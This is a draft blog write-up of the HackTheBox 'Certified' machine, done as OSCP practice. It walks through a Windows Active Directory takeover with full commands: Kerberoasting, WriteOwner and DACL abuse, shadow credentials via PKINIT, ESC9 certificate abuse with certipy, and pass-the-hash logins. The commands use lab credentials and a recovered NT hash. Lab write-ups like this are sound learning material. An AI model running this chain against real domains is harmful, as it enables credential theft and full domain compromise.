+++
date = '2026-05-21T00:00:00-03:00'
draft = true
title = 'HTB: Certified - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'windows', 'active-directory', 'bloodhound', 'writeowner', 'dacl', 'shadow-credentials', 'pkinit', 'adcs', 'esc9', 'kerberos']
description = 'Write-up for HackTheBox Certified - abusing WriteOwner and DACL misconfigs to chain into shadow credentials via PKINIT, then escalating through ADCS ESC9 to impersonate the domain admin.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-certified/cover.png'
+++

Windows AD with a chain of ACL abuses - each hop is one misconfigured permission away from the next. Certified is a great primer for the kind of trust-chain exploitation that shows up constantly in real assessments.

## Machine info

| | |
|---|---|
| **Name** | Certified |
| **Platform** | HackTheBox |
| **OS** | Windows |
| **Difficulty** | Medium |

> This is a credentialed machine - you start with `judith.mader:judith09`.

![Machine information screen](/images/htb-certified/machine-info.png)

## TL;DR

- Start with valid low-priv credentials (`judith.mader`); RID brute enumerates users including `management_svc` and `ca_operator`
- Kerberoast `management_svc` - hash doesn't crack; fix clock skew with `ntpdate` and re-run
- BloodHound reveals `judith.mader` has **WriteOwner** on the `MANAGEMENT` group, which has **GenericWrite** on `management_svc`
- Abuse WriteOwner: take ownership, grant FullControl DACL, join group - now we have GenericWrite on `management_svc`
- Shadow credentials attack via `pywhisker` + PKINIT (`gettgtinit.py` / `getnthash.py`) to extract `management_svc`'s NT hash
- WinRM as `management_svc` - user flag
- `management_svc` has GenericWrite on `ca_operator`; repeat shadow credentials attack
- `ca_operator` can enroll on a vulnerable template (ESC9) - manipulate UPN to impersonate Administrator, request cert, recover NT hash
- WinRM as Administrator - root flag

---

## Recon

### Nmap

```bash
nmap -sV -sC -Pn -A certified.htb
```

![Nmap port scan results](/images/htb-certified/nmap.png)

Classic Windows DC fingerprint: 88 (Kerberos), 389/636 (LDAP/LDAPS), 445 (SMB), 5985 (WinRM), 9389 (AD Web Services). This is a Domain Controller, and WinRM being open means that if we ever get valid creds with the right group membership, we can get a shell without needing RCE.

### SMB - RID brute force

We have credentials, so let's put them to work immediately with `netexec`:

```bash
nxc smb certified.htb -u 'judith.mader' -p 'judith09' --rid-brute
```

![nxc SMB RID brute-force output listing domain users and groups](/images/htb-certified/nxc-rid-brute.png)

RID brute-force enumerates every SID in the domain by iterating RID values and resolving them. Even without special privileges it works because the `SamrLookupIdsInDomain` RPC is readable by any authenticated user.

Notable accounts found: `judith.mader` (us), `management_svc` (has a SPN - Kerberoastable), `ca_operator` (CA-related - interesting for ADCS later), plus `alexander.huges` and `gregory.camron`.

---

## Enumeration

### Kerberoasting

`management_svc` has a SPN, which makes it Kerberoastable - any authenticated user can request a service ticket for it and try to crack the hash offline.

```bash
impacket-GetUserSPNs certified.htb/judith.mader -p 'judith09' -dc-ip 10.129.231.186 -request
```

![GetUserSPNs failing with KRB_AP_ERR_SKEW clock skew error](/images/htb-certified/getuserspns-clockskew.png)

`KRB_AP_ERR_SKEW` - Kerberos requires the client clock to be within 5 minutes of the DC. My Kali was drifting. Quick fix:

```bash
sudo ntpdate 10.129.231.186
```

![ntpdate syncing clock, then successful GetUserSPNs returning management_svc TGS hash](/images/htb-certified/ntpdate-getuserspns.png)

Got the TGS hash for `management_svc`. Passed it to John with `rockyou.txt` - no luck. The password isn't in the wordlist, so offline cracking is a dead end here. Time to enumerate more.

### BloodHound

Spin up `bloodhound-python` to collect the full AD graph:

```bash
bloodhound-python -u 'judith.mader' -p 'judith09' -dc certified.htb -c all -ns 10.129.231.186
```

![bloodhound-python collection output: 10 users, 53 groups, 1 computer found in 0m 27s](/images/htb-certified/bloodhound-collection.png)

Import the JSON files into BloodHound and start hunting for attack paths from `judith.mader`.

### WriteOwner on MANAGEMENT group

![BloodHound graph: JUDITH.MADER has WriteOwner edge pointing to MANAGEMENT group](/images/htb-certified/bloodhound-writeowner.png)

`judith.mader` has **WriteOwner** on the `MANAGEMENT` group. WriteOwner means we can change which security principal *owns* the object. In AD, the owner of an object can always modify its DACL - regardless of what the current DACL says. That's a full privilege escalation path built right into the ownership model.

Clicking further from MANAGEMENT reveals the next step:

![BloodHound path: JUDITH.MADER - WriteOwner - MANAGEMENT - GenericWrite - MANAGEMENT_SVC](/images/htb-certified/bloodhound-attack-path.png)

The full chain: `JUDITH.MADER` -[WriteOwner]-> `MANAGEMENT` -[GenericWrite]-> `MANAGEMENT_SVC`

**GenericWrite** on a user account means we can modify most of their non-protected attributes - including `msDS-KeyCredentialLink`, which is exactly what the shadow credentials technique needs.

---

## Foothold

### Abusing WriteOwner to gain access to MANAGEMENT group

Three steps to go from WriteOwner to effective GenericWrite on `management_svc`:

**Step 1 - Make judith.mader the owner of MANAGEMENT:**

```bash
impacket-owneredit certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186 -action write -new-owner 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb'
```

**Step 2 - Grant herself FullControl by writing a DACL entry:**

```bash
impacket-dacledit certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186 -action write -rights FullControl -principal 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb'
```

**Step 3 - Join the MANAGEMENT group:**

```bash
net rpc group addmem 'Management' 'judith.mader' -U 'certified.htb/judith.mader%judith09' -S '10.129.231.186'
```

![owneredit sets judith as owner, dacledit grants FullControl, net rpc group confirms management_svc and judith.mader both in group](/images/htb-certified/dacl-exploit.png)

`net rpc group members Management` confirms both `judith.mader` and `management_svc` are now in the group. Judith inherits the group's **GenericWrite** on `management_svc` - the door is open.

### Shadow Credentials against management_svc

GenericWrite lets us write to `msDS-KeyCredentialLink` - the attribute that stores PKINIT public key credentials. By adding our own key pair there, we can authenticate *as* `management_svc` using a certificate instead of knowing the password. This is the Shadow Credentials technique - no password reset needed, no account lockout risk, and the real user doesn't notice anything.

```bash
python3 pywhisker.py -d 'certified.htb' -u 'judith.mader' -p 'judith09' --dc-ip 10.129.231.186 --action add --target 'management_svc'
```

![pywhisker generating key pair, saving PEM files, printing the gettgtinit command to use next](/images/htb-certified/pywhisker.png)

`pywhisker` generates an RSA key pair, encodes the public key into a `KeyCredential` blob, writes it to `msDS-KeyCredentialLink` on `management_svc`, saves both PEM files locally, and conveniently prints the exact `PKINITtools` command to use next.

**Get a TGT using the certificate:**

```bash
python3 PKINITtools/gettgtinit.py -cert-pem Wr9hCp58_cert.pem -key-pem Wr9hCp58_priv.pem certified.htb/management_svc Wr9hCp58.ccache
```

![gettgtinit.py authenticating via PKINIT, printing AS-REP encryption key, saving TGT to ccache file](/images/htb-certified/gettgt.png)

**Extract the NT hash from the TGT:**

```bash
export KRB5CCNAME=Wr9hCp58.ccache
python3 PKINITtools/getnthash.py -key e0b16bfd5e8a9a38a5f267d6f763f6862d6b2855dd85fa173933f1eb48c87a5f certified.htb/management_svc
```

![getnthash.py outputting: Recovered NT Hash a091c1832bcdd4677c28b5a6a1295584](/images/htb-certified/getnthash.png)

NT hash recovered: `a091c1832bcdd4677c28b5a6a1295584`.

**Why this works:** PKINIT is the Kerberos pre-authentication mechanism that uses public key cryptography. When the KDC issues the AS-REP, it encrypts the session key using the account's long-term secret (derived from its NT hash). `getnthash.py` knows the session key from the TGT and uses that to reverse-engineer the NT hash - no password, no cracking, pure cryptographic math.

### Shell as management_svc

Verify WinRM access before connecting:

![nxc WinRM showing management_svc Pwn3d!](/images/htb-certified/nxc-winrm-check.png)

`(Pwn3d!)` - `management_svc` is in the Remote Management Users group. Connect:

```bash
evil-winrm -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 -i 10.129.231.186
```

![Evil-WinRM v3.9 shell established, prompt at C:\Users\management_svc\Documents](/images/htb-certified/evil-winrm-shell.png)

![management_svc Desktop - type user.txt displaying the flag hash](/images/htb-certified/user-flag.png)

User flag. Now on to Administrator.

---

## Privilege Escalation

### GenericWrite on ca_operator

Back in BloodHound, `management_svc` has **GenericWrite** on `ca_operator` - the exact same primitive we just exploited. Same playbook, different target. This time we authenticate as `management_svc` using its NT hash:

```bash
python3 pywhisker.py -d 'certified.htb' -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584' --dc-ip 10.129.231.186 --action add --target 'ca_operator'
python3 PKINITtools/gettgtinit.py -cert-pem <cert>.pem -key-pem <priv>.pem certified.htb/ca_operator <ca_op>.ccache
export KRB5CCNAME=<ca_op>.ccache
python3 PKINITtools/getnthash.py -key <asrep_key> certified.htb/ca_operator
```

This gives us `ca_operator`'s NT hash. Now the interesting part.

### ADCS - ESC9 (UPN manipulation to impersonate Administrator)

The machine is literally named "Certified" - Active Directory Certificate Services is the endgame. With `ca_operator` credentials, enumerate what templates are available:

```bash
certipy find -u 'ca_operator' -hashes :<ca_op_hash> -dc-ip 10.129.231.186 -vulnerable -stdout
```

`certipy` finds a template with **ESC9** - specifically the `CT_FLAG_NO_SECURITY_EXTENSION` flag is set, meaning the issued certificate will NOT embed the requester's SID into it. This is the crucial detail: normally the SID in the cert pins it to the actual user who requested it. Without that, the CA issues a cert that only identifies the enrollee by their `userPrincipalName` (UPN).

The attack: GenericWrite lets us set `ca_operator`'s UPN to `Administrator`. We request a cert while that UPN is set. The CA issues a cert that says "this is Administrator." We restore the UPN. Then we use the cert with PKINIT to authenticate - and the KDC sees "Administrator."

```bash
# 1. Set ca_operator's UPN to Administrator
certipy account update -u 'management_svc' -hashes :<mgmt_hash> -dc-ip 10.129.231.186 -user ca_operator -upn Administrator

# 2. Request a certificate as ca_operator - it'll be issued for Administrator's UPN
certipy req -u 'ca_operator' -hashes :<ca_op_hash> -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication

# 3. Restore ca_operator's UPN to avoid conflicts
certipy account update -u 'management_svc' -hashes :<mgmt_hash> -dc-ip 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb

# 4. Use the cert to authenticate as Administrator and recover the NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186
```

`certipy auth` runs PKINIT with the Administrator cert - the KDC trusts it (no SID to contradict the UPN claim), issues a TGT for Administrator, and `certipy` extracts the NT hash using the same AS-REP decryption trick as before.

### Root shell

```bash
evil-winrm -u Administrator -H <administrator_nt_hash> -i 10.129.231.186
```

Administrator shell. `type C:\Users\Administrator\Desktop\root.txt` - done.

---

## Takeaways

- **WriteOwner is an underrated but dangerous ACL edge.** Most people focus on GenericAll or GenericWrite in BloodHound reviews, but WriteOwner quietly grants you DACL control - which is functionally equivalent to GenericAll on the object. It's worth adding to your list of high-value paths.
- **Shadow Credentials is the cleanest GenericWrite exploit on user accounts.** No password reset (which would alert the real user), no SPN modification, no noise. You add a key to one attribute, authenticate via PKINIT, extract the hash, and remove the key. The target account keeps working normally and has no idea.
- **`msDS-KeyCredentialLink` abuse requires ADCS to be present.** PKINIT pre-authentication only works if the domain has a Certificate Authority. Without it, the KDC rejects the cert-based AS-REQ entirely. Always check for ADCS during AD enumeration.
- **ESC9 is subtle because the vulnerability lives in a flag, not a permission.** `CT_FLAG_NO_SECURITY_EXTENSION` is easy to miss during template reviews, but combined with any account that has GenericWrite on an enrollee, it's game over for the domain. Always check template flags with `certipy find -vulnerable`.
- **Clock sync is not optional for Kerberos.** HTB machines drift. Add `sudo ntpdate <dc-ip>` to your standard pre-checklist on every Windows AD box - it takes two seconds and saves a lot of confusion.

## References

- [HackTheBox - Certified](https://app.hackthebox.com/machines/Certified)
- [Shadow Credentials - Elad Shamir (SpecterOps)](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [pywhisker - GitHub](https://github.com/ShutdownRepo/pywhisker)
- [PKINITtools - GitHub](https://github.com/dirkjanm/PKINITtools)
- [Certipy - ESC9 and beyond](https://github.com/ly4k/Certipy)
- [impacket-owneredit / dacledit](https://github.com/fortra/impacket)
- Lain Kusanagi list (OSCP prep)
